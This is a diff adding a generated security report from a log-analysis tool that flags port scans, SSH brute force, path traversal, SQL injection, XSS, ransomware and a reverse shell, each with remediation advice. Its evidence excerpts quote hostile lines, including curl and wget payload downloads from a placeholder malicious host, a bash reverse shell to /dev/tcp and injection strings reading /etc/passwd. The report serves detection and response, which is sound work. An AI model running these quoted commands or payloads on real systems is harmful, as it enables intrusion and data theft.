@@ -1,0 +1,157 @@
+=== Logix Report ===
+Analyzed at (UTC): 2025-09-13T19:33:58.109333Z
+Total lines processed: 30
+
+SUMMARY:
+Possible Port Scan (confidence 0.86)
+
+DETAILED FINDINGS:
+------------------------------------------------------------
+Name: Possible Port Scan
+Severity: 6
+Confidence: 0.86
+Count: 16
+Suggested Remediation:
+  - Block/investigate IP and monitor firewall logs.
+Immediate Precaution: Harden exposed services and use network segmentation.
+Evidence (excerpt):
+  203.0.113.5 targeted ports: [0, 1, 2, 3, 4, 5, 6, 7, 22, 23, 80, 443]
+
+------------------------------------------------------------
+Name: Possible Port Scan
+Severity: 6
+Confidence: 0.86
+Count: 11
+Suggested Remediation:
+  - Block/investigate IP and monitor firewall logs.
+Immediate Precaution: Harden exposed services and use network segmentation.
+Evidence (excerpt):
+  198.51.100.23 targeted ports: [1, 22, 24, 26, 28, 30, 51514, 51515, 51516, 51517, 51518]
+
+------------------------------------------------------------
+Name: Suspicious Download / Binary Fetch
+Severity: 9
+Confidence: 0.99
+Count: 5
+Suggested Remediation:
+  - Isolate host immediately and scan binaries offline.
+  - Block the source domain and remove malicious files.
+Immediate Precaution: Do not execute suspicious files; collect for AV analysis.
+Evidence (excerpt):
+  line 11: Jan 12 09:12:05 webserver access: "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 128 "-" "nikto/2.1.6"
+  line 22: Jan 12 11:00:00 user: curl http://malicious.example.com/payload.sh -o /tmp/payload.sh
+  line 23: Jan 12 11:00:10 user: wget http://malicious.example.com/backdoor.bin -O /tmp/backdoor.bin
+  line 24: Jan 12 11:00:20 user: powershell.exe -EncodedCommand SQBHAH...  # base64-like
+  line 36: Jan 12 13:05:05 webserver access: "GET /app?input=';cat /etc/passwd;' HTTP/1.1" 500 560 "-" "curl/7.68.0"
+
+------------------------------------------------------------
+Name: Authentication Failures / Brute-force
+Severity: 8
+Confidence: 0.99
+Count: 5
+Suggested Remediation:
+  - Block offending IP(s). Enable MFA and account lockout.
+  - Reset targeted accounts and rotate credentials.
+Immediate Precaution: If confirmed, isolate host and check for backdoors.
+Evidence (excerpt):
+  line 2: Jan 12 08:01:22 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51514 ssh2
+  line 3: Jan 12 08:01:24 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51515 ssh2
+  line 4: Jan 12 08:01:26 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51516 ssh2
+  line 5: Jan 12 08:01:28 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51517 ssh2
+  line 6: Jan 12 08:01:30 host sshd[1234]: Failed password for invalid user admin from 198.51.100.23 port 51518 ssh2
+
+------------------------------------------------------------
+Name: Repeated Authentication Failures (by IP)
+Severity: 8
+Confidence: 0.94
+Count: 5
+Suggested Remediation:
+  - Block IP; enable rate-limiting/account lockouts; reset targeted accounts.
+Immediate Precaution: Consider MFA and checking for successful logins around same timeframe.
+Evidence (excerpt):
+  IP 198.51.100.23 had 5 failed attempts.
+
+------------------------------------------------------------
+Name: Scanner / Malicious User-Agent
+Severity: 6
+Confidence: 0.83
+Count: 4
+Suggested Remediation:
+  - Block or rate-limit the offending IPs.
+  - Review web endpoints targeted by the scanner.
+Immediate Precaution: Monitor for repeated scanning and adapt WAF rules.
+Evidence (excerpt):
+  line 9: Jan 12 09:12:01 webserver access: "GET /index.php?id=1' OR '1'='1' -- HTTP/1.1" 200 4523 "-" "sqlmap/1.4"
+  line 11: Jan 12 09:12:05 webserver access: "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 128 "-" "nikto/2.1.6"
+  line 35: Jan 12 13:05:00 webserver access: "GET /scripts/setup.php?cmd=ls%20-la%20%2F HTTP/1.1" 200 1240 "-" "python-requests/2.28"
+  line 36: Jan 12 13:05:05 webserver access: "GET /app?input=';cat /etc/passwd;' HTTP/1.1" 500 560 "-" "curl/7.68.0"
+
+------------------------------------------------------------
+Name: Directory Traversal / LFI
+Severity: 8
+Confidence: 0.79
+Count: 2
+Suggested Remediation:
+  - Validate and normalize file path input.
+  - Restrict web root access and patch file-handling code.
+Immediate Precaution: Inspect file system for unauthorized file access.
+Evidence (excerpt):
+  line 11: Jan 12 09:12:05 webserver access: "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 403 128 "-" "nikto/2.1.6"
+  line 36: Jan 12 13:05:05 webserver access: "GET /app?input=';cat /etc/passwd;' HTTP/1.1" 500 560 "-" "curl/7.68.0"
+
+------------------------------------------------------------
+Name: Command Injection / Reverse Shell
+Severity: 10
+Confidence: 0.7
+Count: 1
+Suggested Remediation:
+  - Disconnect host from network, collect memory image.
+  - Perform full incident response and root cause analysis.
+Immediate Precaution: Treat system as compromised until proven clean.
+Evidence (excerpt):
+  line 26: Jan 12 11:15:00 app[9876]: Suspicious command executed: /bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+
+------------------------------------------------------------
+Name: Ransomware-like activity
+Severity: 10
+Confidence: 0.7
+Count: 1
+Suggested Remediation:
+  - Disconnect host; restore from known-good backups.
+  - Contact IR team; do not pay ransom without legal counsel.
+Immediate Precaution: Preserve encrypted files for forensic analysis.
+Evidence (excerpt):
+  line 31: Jan 12 12:00:00 svc: Ransom note created: /home/user/documents/FILES.ENCRYPTED.locked
+
+------------------------------------------------------------
+Name: Possible SQL Injection
+Severity: 8
+Confidence: 0.63
+Count: 1
+Suggested Remediation:
+  - Sanitize inputs and use parameterized queries.
+  - Apply WAF rules and review DB logs.
+Immediate Precaution: Check database for suspicious queries and exports.
+Evidence (excerpt):
+  line 9: Jan 12 09:12:01 webserver access: "GET /index.php?id=1' OR '1'='1' -- HTTP/1.1" 200 4523 "-" "sqlmap/1.4"
+
+------------------------------------------------------------
+Name: Possible Cross-Site Scripting (XSS)
+Severity: 7
+Confidence: 0.59
+Count: 1
+Suggested Remediation:
+  - Sanitize output; use Content Security Policy (CSP).
+  - Patch application to encode HTML output.
+Immediate Precaution: Avoid using same user session tokens until fixed.
+Evidence (excerpt):
+  line 10: Jan 12 09:12:03 webserver access: "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 234 "-" "Mozilla/5.0"
+
+
+
+[No local user guide found]
+
+IMMEDIATE PRECAUTIONS:
+- If a compromise is suspected: disconnect the device from the network immediately.
+- Preserve evidence: do not reboot the host if possible; collect logs/images only by trained personnel.
+- Change passwords for affected accounts from a separate clean device.
